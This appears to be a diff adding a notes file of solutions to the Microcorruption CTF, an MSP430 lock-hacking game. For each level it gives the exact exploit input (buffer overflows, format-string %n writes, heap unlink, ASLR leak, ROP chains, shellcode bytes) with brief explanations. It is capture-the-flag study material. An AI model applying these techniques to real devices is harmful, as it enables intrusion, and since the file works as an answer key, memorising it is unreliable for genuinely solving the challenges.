@@ -1,0 +1,75 @@
+//Note
+//  For those who want to emulate the process without using the website debugger
+//  pc always start at 0x4400, the other registers are cleared to 0 by default
+//	architecture is MSP430 with minor customization which is documented in manual.pdf
+
+Tutorial	:	plain pwd check					INPUT:'password'
+
+New Orleans :	plain pwd check					INPUT:'p~]&#.q'
+
+Sydney		:	plain pwd check					INPUT:HEX[426b46612c747a62]
+
+Hanoi		:	buffer overflow overwrite flag	INPUT:HEX{[00]*16+[b3]}
+
+Cusco		:	stack overflow overwrite pc		INPUT:HEX{[00]*16+[4644]}
+	hijack return address to <unlock_door 0x4446>
+
+Reykjavik	:	self modifying assembly			INPUT:HEX{cfc1}
+
+Whitehorse	:	stack overflow overwrite pc		INPUT:HEX{[00]*16+[3245]+[0000]+[7f00]}
+	hijack return address to <INT 0x4532> and set argument for it [interrupt 0x7f is unlock]
+
+Montevideo	:	stack overflow via strcpy		INPUT:HEX{[01]*16+[4c45]+[0101]+[7f00]}
+	hijack return address to <INT 0x454c> and set argument for it [interrupt 0x7f is unlock]
+
+Johannesburg:	stack overflow via strcpy		INPUT:HEX{[01]*16+[0182]+[4644]}
+	hijack return address to <unlock_door 0x4446>, also bypass static one byte canary
+
+Santa Cruz	:	stack overflow via strcpy		INPUT:HEX{[01]*17+[0818]+[01]*23+[4a44],[01]*17}
+	hijack return address to <unlock_door 0x444a>
+	note that length check for pwd is performed, and a null byte check is enforced before stored pc
+	so it is necessary to directly overflow with name, change pwd length limit, and use strcpy on pwd to restore null byte
+
+Jakarta		:	stack overflow via strcpy		INPUT:HEX{[01]*32,[01]*4+[4c44]+[01]*218}
+	hijack return address to <unlock_door 0x444c>, bypass length check with integer underflow/overflow logic bug
+
+Addis Ababa	:	format string attack			INPUT:'\x8c\x44%x%n'
+	it is common for protections to be disabled in embedded devices(which is the case for NX here)
+	thus directly overwriting code can let us hijack program flow
+	I chose to change <448a : tst 0(sp)  [8193 0000]> before <unlock_door> call to avoid check
+	since there are no $ operators in LockIP Pro printf implementation, %x is used to exhaust and align arguments
+
+Novosibirsk	:	format string attack			INPUT:'\xc8\x44'+'\x01'*125+'%n'
+	no protection again, let's change 
+		<44c6 : push #0x7e [3012 7e00]; 44ca : call INT [b012 3645]> into 
+		<44c6 : push #0x7f [3012 7f00]; 44ca : call INT [b012 3645]>
+	(There's a 5 bytes solution which depends on noping out a push and playing with stack layout)
+
+Algiers		:	heap overflow + free unlink		INPUT:HEX{[01]*16+[9643]+[2024]+[1f01],[01]}
+	hijack stored pc(at 0x439a) from <__stop_progExec__ 0x4440> to <unlock_door 0x4564> with free unlink mechanism on chunk2(at 0x241e)
+
+Vladivostok	:	defeat aslr through fmt			INPUT:'%x%x',HEX{[00]*8+[code_base+INT_offset]+[0000]+[7f00]}
+	the second %x leaks printf address, while we have <printf_offset 0x476a>	<INT_offset 0x48ec>
+	overflow with second getsn to overwrite return address and provide argument to INT
+
+Lagos		:	alphanumeric stack overflow		INPUT:HEX{[30]*17+[6e44]*22+[5446]+[3044]+[3030],[fc45]+[0000]+[7f00]}
+	The overflow is large enough to overwrite code itself, however, i think doing it in a ROP is cooler, thus the solution
+	<nop 0x446e>
+	<getsn 0x4650> (0x4645) skips the argument pushing phase (push r14; push r15), thus the following 0x4430, 0x3030 are used instead
+	<INT 0x45fc>
+	(An alternative solution to combine ROP to call gets and overwrite code might yield solutions as short as 21 bytes)
+
+Bangalore	:	NX enabled						INPUT:HEX{[00]*16+[ba44]+[4000]+[0000]+[0640]+[3140f03f]+[324000ff]+[b0121000]}
+	Use ROP to modify page permissions, then jump onto assembly to open lock, sp is at 0x4004 after running ROPgadget
+	<mark_page_executable 0x44b4> (0x44ba) skips the argument pushing phase (push #0; push r14), thus the following 0x4000, 0x0000 are used
+	<mov #0x3ff0,sp> : 3140f03f	(move sp to somewhere writeable, so that push pc in call #0x10 will not fail)
+	<mov #0xff00,sr> : 324000ff
+	<call #0x10> : b0121000
+
+Chernobyle	:	heap OOB logic bug+free unlink	INPUT:'new \x10','new \x30','new \x40','new \x50','new \x60', 'new \x0f','new \x1f','new \x2f','new \x3f','new \x4f','new \x0e','new \x1e','new \x2e','new \x3e','new \x32\xd0','new \x0d','new \x1d','new \x2d','new \x3d','new \xfa\x53\xa8\x54\xb5','new \xf6\x4c\x94\x54\xf5\x7e','n'
+	Quite a hassle... Basically uses unlink to overwrite <bis #0x8000,sr> to <bis #0xff00,sr> in <INT>, so that any interrupt will result in opening door
+
+Hollywood	:	obfuscated ROP reverse			INPUT:HEX{[1101a55eee48]}	#multiple possible solutions
+	the original ROP packs a lot of gadgets, and as it runs, it copies those gadgets to random address, execute it, then proceeds to next gadget
+	most gadgets are just placeholders to lengthen tracing process and make it miserable
+	the important parts are that at some point input is read, and hashed. certain checks are enforced and the lock finally interrupt on a code depending on hashed output.
